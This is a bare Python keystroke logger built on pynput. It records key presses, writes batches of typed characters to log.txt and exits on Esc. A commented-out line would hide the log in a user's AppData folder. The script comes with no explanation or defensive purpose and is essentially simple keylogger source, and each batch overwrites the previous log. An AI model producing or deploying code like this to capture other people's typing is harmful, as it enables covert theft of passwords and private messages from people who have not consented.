from pynput.keyboard import Key, Listener


count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    if count > 20:
        write_file(keys)
        count = 0
        keys = []

# with open("C:/Users/Julian/AppData/Local/rbmk/log.txt", "w") as f:
def write_file(keys):
    with open("log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

        
